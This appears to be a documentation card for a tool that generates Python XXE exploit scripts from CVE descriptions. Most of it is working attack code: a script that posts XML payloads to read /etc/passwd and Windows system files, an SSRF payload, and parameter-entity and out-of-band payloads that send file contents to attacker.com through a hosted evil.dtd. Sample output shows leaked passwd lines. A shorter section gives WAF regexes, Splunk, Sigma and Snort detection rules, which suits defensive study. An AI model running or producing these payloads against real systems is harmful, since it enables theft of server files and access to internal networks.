# XXE (XML External Entity) Exploit Generation

## Overview
- **Purpose**: Automatically generate Python exploit scripts for XML External Entity (XXE) vulnerabilities from CVE data
- **Category**: exploitation
- **Severity**: high
- **Tags**: xxe, xml-external-entity, xml-injection, exploit-generation, cve, ssrf, file-disclosure, T1203

## Context and Use-Cases
- Generate working XXE exploits from CVE descriptions
- Test file disclosure via external entity injection
- Test SSRF (Server-Side Request Forgery) via HTTP entities
- Test parameter entity attacks for data exfiltration
- Useful for penetration testing, vulnerability validation, and security research
- Demonstrate impact through sensitive file disclosure and internal network access

## Key Parameters and Inputs
- **cve_data** (dict, required): CVE information including `cve_id`, `description`. Example: `{"cve_id": "CVE-2024-7890", "description": "XXE in XML parser"}`
- **target_info** (dict, required): Target configuration. Example: `{"target_url": "http://target.com/api/xml"}`
- **details** (dict, optional): Additional vulnerability details. Example: `{"payload_location": "xml"}`

## Procedure
1. Parse CVE description to identify XXE vulnerability in XML processing
2. Generate Python exploit class with session management
3. Create `generate_xxe_payloads()` method with multiple techniques:
   - Basic file read (file:///etc/passwd)
   - Windows file read (file:///C:/windows/system32/drivers/etc/hosts)
   - HTTP SSRF (http://attacker.com)
   - Parameter entity for data exfiltration
4. Implement `test_xxe()` method to send XML payloads and verify exploitation
5. Check responses for file content indicators
6. Add command-line interface accepting target URL
7. Return complete exploit script with usage instructions

## Examples

### Generated Exploit Script Structure
```python
#!/usr/bin/env python3
# XXE (XML External Entity) Exploit for CVE-2024-7890
# Vulnerability: XXE in XML parser

import requests
import sys

class XXEExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()

    def generate_xxe_payloads(self):
        """Generate XXE payloads"""
        payloads = [
            # Basic file read
            '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<root>&xxe;</root>',
            
            # Windows file read
            '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">]>\n<root>&xxe;</root>',
            
            # HTTP request (SSRF)
            '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>\n<root>&xxe;</root>',
            
            # Parameter entity
            '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [\n<!ENTITY % xxe SYSTEM "file:///etc/passwd">\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM \'http://attacker.com/?%xxe;\'>">\n%param1;\n]>\n<root>&exfil;</root>'
        ]
        
        return payloads

    def test_xxe(self):
        """Test for XXE vulnerability"""
        print("[+] Testing XXE vulnerability...")
        
        payloads = self.generate_xxe_payloads()
        
        for i, payload in enumerate(payloads):
            try:
                headers = {"Content-Type": "application/xml"}
                response = self.session.post(
                    self.target_url,
                    data=payload,
                    headers=headers
                )
                
                # Check for file content indicators
                indicators = [
                    "root:", "daemon:", "bin:",  # /etc/passwd
                    "localhost", "127.0.0.1",   # hosts file
                    "<?xml", "<!DOCTYPE"        # XML processing
                ]
                
                if any(indicator in response.text for indicator in indicators):
                    print(f"[+] XXE vulnerability found with payload {i+1}")
                    print(f"[+] Response: {response.text[:200]}...")
                    return True
            
            except Exception as e:
                continue
        
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <target_url>")
        print(f"Example: python3 {sys.argv[0]} http://target.com/xml")
        sys.exit(1)
    
    target_url = sys.argv[1]
    exploit = XXEExploit(target_url)
    
    print(f"[+] XXE Exploit for CVE-2024-7890")
    print(f"[+] Target: {target_url}")
    
    if exploit.test_xxe():
        print("[+] XXE vulnerability confirmed!")
    else:
        print("[-] No XXE vulnerability found")

if __name__ == "__main__":
    main()
```

### Usage Examples

**Basic XXE Testing**
```bash
python3 xxe_exploit.py http://target.com/api/xml

# Output:
# [+] XXE Exploit for CVE-2024-7890
# [+] Target: http://target.com/api/xml
# [+] Testing XXE vulnerability...
# [+] XXE vulnerability found with payload 1
# [+] Response: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin...
# [+] XXE vulnerability confirmed!
```

**Manual XXE Payload Testing**
```bash
# Test with curl
curl -X POST http://target.com/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'
```

**XXE for SSRF**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://internal-server:8080/admin">]>
<root>&xxe;</root>
```

**Out-of-Band XXE (Blind)**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
%remote;
%param1;
]>
<root>&exfil;</root>

<!-- evil.dtd on attacker server:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
-->
```

## Indicators / Detection

### Log Sources
- Web server access logs
- Web Application Firewall (WAF) logs
- XML parser error logs
- Network traffic logs (for SSRF detection)

### Detection Patterns

**WAF/IDS Rules (Regex)**
```regex
# XXE DOCTYPE and ENTITY declarations
<!DOCTYPE[^>]*\[.*<!ENTITY

# External entity references
SYSTEM\s+["']file://
SYSTEM\s+["']http://
SYSTEM\s+["']ftp://

# Parameter entities
<!ENTITY\s+%
```

**Splunk Query**
```spl
index=web_logs 
| regex _raw="(?i)(<!DOCTYPE|<!ENTITY|SYSTEM\s+[\"']file://|SYSTEM\s+[\"']http://)"
| stats count by src_ip, uri, method
| where count > 2
```

**Sigma Rule**
```yaml
title: XXE Attack Pattern Detection
logsource:
  category: webserver
detection:
  selection_doctype:
    cs-method: POST
    cs-uri-query|contains:
      - '<!DOCTYPE'
      - '<!ENTITY'
  selection_system:
    cs-uri-query|contains:
      - 'SYSTEM "file://'
      - 'SYSTEM "http://'
      - 'SYSTEM "ftp://'
  condition: selection_doctype and selection_system
level: high
```

**Network Detection - SSRF via XXE**
```
# Snort/Suricata rule
alert http any any -> any any (
  msg:"XXE SSRF Attempt";
  content:"<!DOCTYPE"; nocase;
  content:"<!ENTITY"; nocase;
  content:"SYSTEM"; nocase;
  content:"http://"; nocase;
  sid:1000001;
)
```


## Limitations and Caveats

- **Content Detection**: Relies on file content appearing in response; blind XXE requires out-of-band channels
- **Parser Variations**: Different XML parsers have different default configurations
- **Error Suppression**: May not detect XXE if application suppresses parser errors
- **Encoding Issues**: Some parsers may not handle certain file encodings
- **File Permissions**: Can only read files accessible to web server user
- **SSRF Detection**: HTTP-based XXE may not return response content directly
- **Parameter Entities**: More complex attacks require hosting external DTD files
- **Modern Parsers**: Many modern XML libraries disable external entities by default

## Source Excerpts

### [S1] XXE Vulnerability Detection
```python
# From exploit_template.py lines 317-320
# XXE detection
elif any(keyword in description_lower for keyword in ["xxe", "xml external entity"]):
    vuln_type = "xxe"
    specific_details["payload_location"] = "xml"
```

### [S2] XXE Payload Generation
```python
# From exploit_template.py lines 1082-1098
def generate_xxe_payloads(self):
    """Generate XXE payloads"""
    payloads = [
        # Basic file read
        '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\\n<root>&xxe;</root>',
        
        # Windows file read
        '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">]>\\n<root>&xxe;</root>',
        
        # HTTP request (SSRF)
        '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>\\n<root>&xxe;</root>',
        
        # Parameter entity
        '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [\\n<!ENTITY % xxe SYSTEM "file:///etc/passwd">\\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM \\'http://attacker.com/?%xxe;\\'>">\\n%param1;\\n]>\\n<root>&exfil;</root>'
    ]
    
    return payloads
```

### [S3] XXE Testing and Verification
```python
# From exploit_template.py lines 1100-1130
def test_xxe(self):
    """Test for XXE vulnerability"""
    print("[+] Testing XXE vulnerability...")
    
    payloads = self.generate_xxe_payloads()
    
    for i, payload in enumerate(payloads):
        try:
            headers = {{"Content-Type": "application/xml"}}
            response = self.session.post(
                self.target_url,
                data=payload,
                headers=headers
            )
            
            # Check for file content indicators
            indicators = [
                "root:", "daemon:", "bin:",  # /etc/passwd
                "localhost", "127.0.0.1",   # hosts file
                "<?xml", "<!DOCTYPE"        # XML processing
            ]
            
            if any(indicator in response.text for indicator in indicators):
                print(f"[+] XXE vulnerability found with payload {{i+1}}")
                print(f"[+] Response: {{response.text[:200]}}...")
                return True
        
        except Exception as e:
            continue
    
    return False
```
